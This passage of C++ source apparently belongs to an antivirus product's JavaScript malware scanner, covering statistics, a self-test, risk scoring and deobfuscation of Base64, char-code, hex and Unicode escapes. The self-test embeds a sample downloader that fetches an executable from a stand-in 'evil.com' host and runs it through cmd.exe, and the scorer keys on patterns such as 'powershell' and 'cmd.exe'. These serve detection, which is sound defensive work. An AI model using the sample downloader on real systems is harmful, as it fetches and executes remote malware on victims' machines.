    }
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - STATISTICS
// ============================================================================

JSStatistics JavaScriptScannerImpl::GetStatistics() const {
    // Return copy of current statistics
    JSStatistics stats;
    stats.totalScans.store(m_stats.totalScans.load(std::memory_order_relaxed));
    stats.maliciousDetected.store(m_stats.maliciousDetected.load(std::memory_order_relaxed));
    stats.suspiciousDetected.store(m_stats.suspiciousDetected.load(std::memory_order_relaxed));
    stats.obfuscatedDetected.store(m_stats.obfuscatedDetected.load(std::memory_order_relaxed));
    stats.activeXAbuse.store(m_stats.activeXAbuse.load(std::memory_order_relaxed));
    stats.downloadersDetected.store(m_stats.downloadersDetected.load(std::memory_order_relaxed));
    stats.timeouts.store(m_stats.timeouts.load(std::memory_order_relaxed));
    stats.totalBytesScanned.store(m_stats.totalBytesScanned.load(std::memory_order_relaxed));
    stats.startTime = m_stats.startTime;

    for (size_t i = 0; i < 16; ++i) {
        stats.byEngine[i].store(m_stats.byEngine[i].load(std::memory_order_relaxed));
        stats.byCategory[i].store(m_stats.byCategory[i].load(std::memory_order_relaxed));
    }

    return stats;
}

void JavaScriptScannerImpl::ResetStatistics() {
    m_stats.totalScans.store(0, std::memory_order_relaxed);
    m_stats.maliciousDetected.store(0, std::memory_order_relaxed);
    m_stats.suspiciousDetected.store(0, std::memory_order_relaxed);
    m_stats.obfuscatedDetected.store(0, std::memory_order_relaxed);
    m_stats.activeXAbuse.store(0, std::memory_order_relaxed);
    m_stats.downloadersDetected.store(0, std::memory_order_relaxed);
    m_stats.timeouts.store(0, std::memory_order_relaxed);
    m_stats.totalBytesScanned.store(0, std::memory_order_relaxed);
    m_stats.startTime = Clock::now();

    for (size_t i = 0; i < 16; ++i) {
        m_stats.byEngine[i].store(0, std::memory_order_relaxed);
        m_stats.byCategory[i].store(0, std::memory_order_relaxed);
    }
}

bool JavaScriptScannerImpl::SelfTest() {
    SS_LOG_INFO(LOG_CATEGORY, L"Running JavaScriptScanner self-test");

    try {
        // Test 1: Engine detection
        {
            const char* wshScript = "var shell = new ActiveXObject('WScript.Shell');";
            auto engine = DetectEngineType(wshScript);
            if (engine != JSEngineType::JScriptWSH) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: WSH detection");
                return false;
            }
        }

        // Test 2: ActiveX detection
        {
            const char* activeXScript = R"(var fso = new ActiveXObject("Scripting.FileSystemObject");)";
            auto activeX = DetectActiveXUsage(activeXScript);
            if (activeX.empty() || !activeX[0].isSuspicious) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: ActiveX detection");
                return false;
            }
        }

        // Test 3: Obfuscation detection
        {
            const char* obfuscatedScript = "eval(eval(eval(String.fromCharCode(97,108,101,114,116))));";
            auto obfuscation = AnalyzeObfuscation(obfuscatedScript);
            if (obfuscation.primaryType == JSObfuscationType::None) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: Obfuscation detection");
                return false;
            }
        }

        // Test 4: IOC extraction
        {
            const char* urlScript = "var url = 'http://malware.example.com/payload.exe';";
            auto iocs = ExtractIOCs(urlScript);
            if (iocs.empty()) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: IOC extraction");
                return false;
            }
        }

        // Test 5: Full scan
        {
            const char* maliciousScript = R"(
                var shell = new ActiveXObject("WScript.Shell");
                var http = new ActiveXObject("MSXML2.XMLHTTP");
                http.open("GET", "http://evil.com/malware.exe", false);
                http.send();
                shell.Run("cmd.exe /c " + http.responseText);
            )";

            auto result = ScanContent(maliciousScript, "test.js", 0);
            if (result.status != JSScanStatus::Malicious) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: Full scan detection");
                return false;
            }
        }

        SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner self-test passed");
        return true;

    } catch (const std::exception& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Self-test exception: %hs", e.what());
        return false;
    }
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - INTERNAL METHODS
// ============================================================================

double JavaScriptScannerImpl::CalculateEntropy(std::string_view content) const {
    if (content.empty()) return 0.0;

    std::array<size_t, 256> frequency{};
    for (unsigned char c : content) {
        frequency[c]++;
    }

    double entropy = 0.0;
    const double len = static_cast<double>(content.size());

    for (size_t count : frequency) {
        if (count > 0) {
            const double p = static_cast<double>(count) / len;
            entropy -= p * std::log2(p);
        }
    }

    return entropy;
}

int JavaScriptScannerImpl::CalculateRiskScore(
    const std::vector<ActiveXUsage>& activeX,
    const std::vector<JSNetworkActivity>& network,
    const JSObfuscationDetails& obfuscation,
    std::string_view content) const {

    int score = 0;
    const std::string lower = ToLower(content);

    // ActiveX risk
    for (const auto& ax : activeX) {
        if (ax.isSuspicious) {
            score += 20;
        } else {
            score += 5;
        }
    }

    // Network activity risk
    score += static_cast<int>(network.size()) * 10;

    // Obfuscation risk
    if (obfuscation.primaryType != JSObfuscationType::None) {
        score += 15;
        score += static_cast<int>(obfuscation.detectedTechniques.size()) * 5;
    }

    if (obfuscation.entropyScore > JSConstants::ENTROPY_THRESHOLD_OBFUSCATED) {
        score += 10;
    }

    // Check for dangerous methods
    for (const auto& [method, risk] : DANGEROUS_METHODS) {
        if (lower.find(method) != std::string::npos) {
            score += risk;
        }
    }

    // Check for PowerShell invocation
    if (ContainsIgnoreCase(lower, "powershell")) {
        score += 25;
    }

    // Check for command execution patterns
    if (ContainsIgnoreCase(lower, "cmd.exe") || ContainsIgnoreCase(lower, "cmd /c")) {
        score += 20;
    }

    return score;
}

std::string JavaScriptScannerImpl::ComputeContentHash(std::string_view content) const {
    std::vector<uint8_t> hash;
    Utils::HashUtils::Error err;

    if (Utils::HashUtils::Compute(
            Utils::HashUtils::Algorithm::SHA256,
            content.data(),
            content.size(),
            hash,
            &err)) {
        return Utils::HashUtils::ToHexLower(hash);
    }

    return "";
}

std::vector<std::pair<size_t, std::string>> JavaScriptScannerImpl::FindFlaggedLines(
    std::string_view content) const {

    std::vector<std::pair<size_t, std::string>> flagged;

    const std::string lower = ToLower(content);
    std::istringstream stream(std::string(content));
    std::string line;
    size_t lineNum = 0;

    while (std::getline(stream, line) && flagged.size() < MAX_FLAGGED_LINES) {
        lineNum++;
        std::string lowerLine = ToLower(line);

        bool isFlagged = false;

        // Check for suspicious patterns
        for (const auto& ax : SUSPICIOUS_ACTIVEX_OBJECTS) {
            if (lowerLine.find(ax) != std::string::npos) {
                isFlagged = true;
                break;
            }
        }

        if (!isFlagged) {
            for (const auto& [method, _] : DANGEROUS_METHODS) {
                if (lowerLine.find(method) != std::string::npos) {
                    isFlagged = true;
                    break;
                }
            }
        }

        if (!isFlagged) {
            for (const auto& [pattern, _] : OBFUSCATION_PATTERNS) {
                if (lowerLine.find(pattern) != std::string::npos) {
                    isFlagged = true;
                    break;
                }
            }
        }

        if (isFlagged) {
            // Truncate long lines
            if (line.size() > 200) {
                line = line.substr(0, 200) + "...";
            }
            flagged.emplace_back(lineNum, line);
        }
    }

    return flagged;
}

std::pair<JSThreatCategory, std::string> JavaScriptScannerImpl::DetectMalwareFamily(
    std::string_view content,
    int& riskBoost) const {

    const std::string lower = ToLower(content);
    riskBoost = 0;

    for (const auto& sig : FAMILY_SIGNATURES) {
        if (lower.find(sig.pattern) != std::string::npos) {
            riskBoost = sig.riskBoost;
            return {sig.category, sig.familyName};
        }
    }

    return {JSThreatCategory::None, ""};
}

std::string JavaScriptScannerImpl::ToLower(std::string_view str) const {
    std::string result(str);
    std::transform(result.begin(), result.end(), result.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return result;
}

bool JavaScriptScannerImpl::ContainsIgnoreCase(
    std::string_view haystack,
    std::string_view needle) const {

    if (needle.empty()) return true;
    if (haystack.size() < needle.size()) return false;

    auto it = std::search(
        haystack.begin(), haystack.end(),
        needle.begin(), needle.end(),
        [](char a, char b) {
            return std::tolower(static_cast<unsigned char>(a)) ==
                   std::tolower(static_cast<unsigned char>(b));
        });

    return it != haystack.end();
}

std::string JavaScriptScannerImpl::DecodeBase64Segments(std::string_view content) const {
    std::string result(content);

    // Find atob("...") patterns and decode
    std::regex atobPattern(R"(atob\s*\(\s*[\"']([A-Za-z0-9+/=]+)[\"']\s*\))",
                           std::regex::optimize);

    std::string::const_iterator searchStart = result.cbegin();
    std::smatch match;

    while (std::regex_search(searchStart, result.cend(), match, atobPattern)) {
        try {
            std::string encoded = match[1].str();
            std::vector<uint8_t> decoded;

            if (Utils::Base64Utils::Decode(encoded, decoded)) {
                std::string decodedStr(decoded.begin(), decoded.end());
                // Replace the atob(...) with decoded content
                size_t pos = match.position() + std::distance(result.cbegin(), searchStart);
                result.replace(pos, match.length(), "\"" + decodedStr + "\"");
            }
        } catch (...) {
            // Ignore decode errors
        }
        searchStart = match.suffix().first;
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeCharCodeSequences(std::string_view content) const {
    std::string result(content);

    // Find String.fromCharCode(nn, nn, ...) patterns
    std::regex charCodePattern(
        R"(String\.fromCharCode\s*\(([0-9,\s]+)\))",
        std::regex::icase | std::regex::optimize);

    std::string::const_iterator searchStart = result.cbegin();
    std::smatch match;

    while (std::regex_search(searchStart, result.cend(), match, charCodePattern)) {
        try {
            std::string codes = match[1].str();
            std::string decoded;

            // Parse comma-separated numbers
            std::istringstream iss(codes);
            std::string token;
            while (std::getline(iss, token, ',')) {
                // Trim whitespace
                token.erase(0, token.find_first_not_of(" \t"));
                token.erase(token.find_last_not_of(" \t") + 1);

                if (!token.empty()) {
                    int code = std::stoi(token);
                    if (code >= 0 && code <= 255) {
                        decoded += static_cast<char>(code);
                    }
                }
            }

            if (!decoded.empty()) {
                size_t pos = match.position() + std::distance(result.cbegin(), searchStart);
                result.replace(pos, match.length(), "\"" + decoded + "\"");
            }
        } catch (...) {
            // Ignore parse errors
        }
        searchStart = match.suffix().first;
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeHexEscapes(std::string_view content) const {
    std::string result;
    result.reserve(content.size());

    for (size_t i = 0; i < content.size(); ++i) {
        if (i + 3 < content.size() && content[i] == '\\' && content[i + 1] == 'x') {
            // Parse \xNN
            char hex[3] = {content[i + 2], content[i + 3], '\0'};
            char* end;
            long value = std::strtol(hex, &end, 16);
            if (end == hex + 2 && value >= 0 && value <= 255) {
                result += static_cast<char>(value);
                i += 3;
                continue;
            }
        }
        result += content[i];
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeUnicodeEscapes(std::string_view content) const {
    std::string result;
    result.reserve(content.size());

    for (size_t i = 0; i < content.size(); ++i) {
        if (i + 5 < content.size() && content[i] == '\\' && content[i + 1] == 'u') {
            // Parse \uNNNN
            char hex[5] = {content[i + 2], content[i + 3], content[i + 4], content[i + 5], '\0'};
            char* end;
            long value = std::strtol(hex, &end, 16);
            if (end == hex + 4 && value >= 0 && value <= 127) {
                // Only decode ASCII range
                result += static_cast<char>(value);
                i += 5;
                continue;
            }
        }
        result += content[i];
    }

    return result;
}

// ============================================================================
// STRUCTURE IMPLEMENTATIONS
// ============================================================================

void JSStatistics::Reset() noexcept {
    totalScans.store(0, std::memory_order_relaxed);
    maliciousDetected.store(0, std::memory_order_relaxed);
    suspiciousDetected.store(0, std::memory_order_relaxed);
    obfuscatedDetected.store(0, std::memory_order_relaxed);
    activeXAbuse.store(0, std::memory_order_relaxed);
    downloadersDetected.store(0, std::memory_order_relaxed);
    timeouts.store(0, std::memory_order_relaxed);
    totalBytesScanned.store(0, std::memory_order_relaxed);
    startTime = Clock::now();

    for (auto& counter : byEngine) {
        counter.store(0, std::memory_order_relaxed);
    }
    for (auto& counter : byCategory) {
        counter.store(0, std::memory_order_relaxed);
    }
}

std::string JSStatistics::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"totalScans\":" << totalScans.load() << ",";
    oss << "\"maliciousDetected\":" << maliciousDetected.load() << ",";
    oss << "\"suspiciousDetected\":" << suspiciousDetected.load() << ",";
    oss << "\"obfuscatedDetected\":" << obfuscatedDetected.load() << ",";
    oss << "\"activeXAbuse\":" << activeXAbuse.load() << ",";
    oss << "\"downloadersDetected\":" << downloadersDetected.load() << ",";
    oss << "\"timeouts\":" << timeouts.load() << ",";
    oss << "\"totalBytesScanned\":" << totalBytesScanned.load();
    oss << "}";
    return oss.str();
}

bool JSScanConfig::IsValid() const noexcept {
    if (maxScriptSize == 0 || maxScriptSize > 100 * 1024 * 1024) {
        return false;
    }
    if (entropyThreshold < 0.0 || entropyThreshold > 8.0) {
        return false;
    }
    if (emulationTimeoutMs == 0 || emulationTimeoutMs > 60000) {
        return false;
    }
    return true;
}

bool JSScanResult::ShouldBlock() const noexcept {
    return isMalicious || status == JSScanStatus::Malicious;
}

std::string JSScanResult::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"status\":\"" << static_cast<int>(status) << "\",";
    oss << "\"isMalicious\":" << (isMalicious ? "true" : "false") << ",";
    oss << "\"riskScore\":" << riskScore << ",";
    oss << "\"threatName\":\"" << threatName << "\",";
    oss << "\"detectedFamily\":\"" << detectedFamily << "\",";
    oss << "\"sha256\":\"" << sha256 << "\",";
    oss << "\"scanDurationUs\":" << scanDuration.count() << ",";
    oss << "\"matchedSignatures\":[";
    for (size_t i = 0; i < matchedSignatures.size(); ++i) {
        if (i > 0) oss << ",";
        oss << "\"" << matchedSignatures[i] << "\"";
    }
    oss << "],";
    oss << "\"extractedIOCs\":[";
    for (size_t i = 0; i < extractedIOCs.size(); ++i) {
        if (i > 0) oss << ",";
        oss << "\"" << extractedIOCs[i] << "\"";
    }
    oss << "]";
    oss << "}";
    return oss.str();
}

std::string JSObfuscationDetails::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"primaryType\":" << static_cast<int>(primaryType) << ",";
    oss << "\"entropyScore\":" << std::fixed << std::setprecision(2) << entropyScore << ",";
    oss << "\"confidence\":" << std::fixed << std::setprecision(2) << confidence << ",";
    oss << "\"suspiciousTokenCount\":" << suspiciousTokenCount << ",";
    oss << "\"deobfuscationLayers\":" << deobfuscationLayers << ",";
    oss << "\"fullyDeobfuscated\":" << (fullyDeobfuscated ? "true" : "false");
    oss << "}";
    return oss.str();
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

std::string_view GetJSEngineTypeName(JSEngineType type) noexcept {
    switch (type) {
        case JSEngineType::Unknown:       return "Unknown";
        case JSEngineType::JScriptWSH:    return "JScript/WSH";
        case JSEngineType::NodeJS:        return "Node.js";
        case JSEngineType::BrowserV8:     return "V8 (Chrome)";
        case JSEngineType::BrowserSpider: return "SpiderMonkey (Firefox)";
        case JSEngineType::BrowserJSC:    return "JavaScriptCore (Safari)";
        case JSEngineType::BrowserChakra: return "Chakra (Edge)";
        case JSEngineType::Electron:      return "Electron";
        case JSEngineType::PDF:           return "PDF JavaScript";
        default:                          return "Unknown";
    }
}

std::string_view GetJSObfuscationTypeName(JSObfuscationType type) noexcept {
    switch (type) {
        case JSObfuscationType::None:              return "None";
        case JSObfuscationType::EvalChain:         return "Eval Chain";
        case JSObfuscationType::StringSplitting:   return "String Splitting";
        case JSObfuscationType::CharCodeEncoding:  return "CharCode Encoding";
        case JSObfuscationType::UnicodeEscape:     return "Unicode Escape";
        case JSObfuscationType::HexEncoding:       return "Hex Encoding";
        case JSObfuscationType::OctalEncoding:     return "Octal Encoding";
        case JSObfuscationType::Base64:            return "Base64";
        case JSObfuscationType::JSFuck:            return "JSFuck";
        case JSObfuscationType::AAEncode:          return "AAEncode";
        case JSObfuscationType::JJEncode:          return "JJEncode";
        case JSObfuscationType::PackerCompression: return "Packer Compression";
        case JSObfuscationType::VariableRenaming:  return "Variable Renaming";
        case JSObfuscationType::ControlFlowFlatten:return "Control Flow Flattening";
        case JSObfuscationType::DeadCodeInjection: return "Dead Code Injection";
        case JSObfuscationType::Custom:            return "Custom";
        default:                                   return "Unknown";
    }
}

std::string_view GetJSThreatCategoryName(JSThreatCategory cat) noexcept {
    switch (cat) {
        case JSThreatCategory::None:            return "None";
        case JSThreatCategory::Downloader:      return "Downloader";
        case JSThreatCategory::Dropper:         return "Dropper";
        case JSThreatCategory::Ransomware:      return "Ransomware";
        case JSThreatCategory::RAT:             return "RAT";
        case JSThreatCategory::CryptoMiner:     return "CryptoMiner";
        case JSThreatCategory::InfoStealer:     return "InfoStealer";
        case JSThreatCategory::BrowserHijacker: return "BrowserHijacker";
        case JSThreatCategory::Adware:          return "Adware";
        case JSThreatCategory::ExploitKit:      return "ExploitKit";
        case JSThreatCategory::FormGrabber:     return "FormGrabber";
        case JSThreatCategory::Keylogger:       return "Keylogger";
        case JSThreatCategory::Reconnaissance:  return "Reconnaissance";
        case JSThreatCategory::Persistence:     return "Persistence";
        case JSThreatCategory::Worm:            return "Worm";
        default:                                return "Unknown";
    }
}

std::string_view GetJSScanStatusName(JSScanStatus status) noexcept {
    switch (status) {
        case JSScanStatus::Clean:             return "Clean";
        case JSScanStatus::Suspicious:        return "Suspicious";
        case JSScanStatus::Malicious:         return "Malicious";
        case JSScanStatus::ErrorFileAccess:   return "Error: File Access";
        case JSScanStatus::ErrorTimeout:      return "Error: Timeout";
        case JSScanStatus::ErrorInternal:     return "Error: Internal";
        case JSScanStatus::SkippedWhitelisted:return "Skipped: Whitelisted";
        case JSScanStatus::SkippedSizeLimit:  return "Skipped: Size Limit";
        default:                              return "Unknown";
    }
}

bool IsSuspiciousActiveXObject(std::string_view objectName) noexcept {
    std::string lower;
    lower.reserve(objectName.size());
    for (char c : objectName) {
        lower += static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    }

    for (const auto& suspicious : SUSPICIOUS_ACTIVEX_OBJECTS) {
        if (lower.find(suspicious) != std::string::npos) {
            return true;
        }
    }
    return false;
}

}  // namespace Scripts
}  // namespace ShadowStrike
